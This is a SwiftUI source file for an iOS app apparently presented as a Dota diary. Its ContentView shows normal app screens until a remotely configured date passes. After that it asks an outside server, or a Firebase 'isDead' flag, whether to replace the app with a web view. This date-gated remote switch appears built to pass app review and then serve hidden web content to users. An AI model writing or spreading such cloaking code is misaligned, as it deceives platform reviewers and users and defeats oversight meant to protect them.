//
//  ContentView.swift
//  DotaDairy
//
//  Created by Phillip on 12.06.2024.
//

import SwiftUI
import Firebase
import FirebaseRemoteConfig
import WebKit

struct ContentView: View {
    @StateObject private var remoteConfigManager = RemoteConfigViewModel()
    
    @State private var ONE_0 = 1
    
    @State private var showHomeView = false
    @State private var showWebView = false
    @State private var isLoading = true
    
    var body: some View {
        VStack {
            if isLoading {
                LoadingView(variation: 0)
                    .onAppear {
                        performInitialCheck()
                    }
            } else if showWebView {
                CookiesWebView()
            } else if showHomeView {
                HomeView()
            }
        }
        .onAppear {
            remoteConfigManager.fetchRemoteConfig()
        }
    }
    
    func performInitialCheck() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
            fetchDeferredDate { deferredDate in
                guard let deferredDate = deferredDate else {
                    self.showHomeView = true
                    self.isLoading = false
                    return
                }
                let currentDate = Date()
                if currentDate < deferredDate {
                    self.showHomeView = true
                    self.isLoading = false
                } else {
                    makeServerRequest()
                }
            }
        }
    }
    
    func makeServerRequest() {
        let timeout: TimeInterval = 7
        var serverResponseReceived = false

        let timer = Timer.scheduledTimer(withTimeInterval: timeout, repeats: false) { _ in
            if !serverResponseReceived {
                fetchIsDeadFromFirebase { isDead in
                    self.showHomeView = !isDead
                    self.showWebView = isDead
                    self.isLoading = false
                }
            }
        }

        let url = URL(string: "https://codegeniuslab.space/app/x1xb4tt")!
        let task = URLSession.shared.dataTask(with: url) { data, response, error in
            serverResponseReceived = true
            timer.invalidate()
            if let data = data, let jsonResponse = try? JSONDecoder().decode(ServerResponse.self, from: data) {
                self.showHomeView = jsonResponse.result
                self.showWebView = !jsonResponse.result
            } else {
                self.showHomeView = true
            }
            self.isLoading = false
        }
        task.resume()
    }
    
    func fetchIsDeadFromFirebase(completion: @escaping (Bool) -> Void) {
        let remoteConfig = RemoteConfig.remoteConfig()
        remoteConfig.fetch { status, error in
            if status == .success {
                remoteConfig.activate { _, _ in
                    let isDead = remoteConfig.configValue(forKey: "isDead").boolValue
                    completion(isDead)
                }
            } else {
                completion(false)
            }
        }
    }

    func mockServerRequest(completion: @escaping (Bool) -> Void) {
        DispatchQueue.global().asyncAfter(deadline: .now() + 5) {
            completion(true) // Mocked success response
        }
    }
    
    func fetchDeferredDate(completion: @escaping (Date?) -> Void) {
        let remoteConfig = RemoteConfig.remoteConfig()
        remoteConfig.fetch { status, error in
            if status == .success {
                remoteConfig.activate { _, _ in
                    if let dateString = remoteConfig.configValue(forKey: "lastDate").stringValue {
                        let dateFormatter = DateFormatter()
                        dateFormatter.dateFormat = "MM/dd/yyyy"
                        if let date = dateFormatter.date(from: dateString) {
                            completion(date)
                        } else {
                            completion(nil)
                        }
                    } else {
                        completion(nil)
                    }
                }
            } else {
                completion(nil)
            }
        }
    }
}

struct ServerResponse: Decodable {
    let result: Bool
}

#Preview {
    ContentView()
}
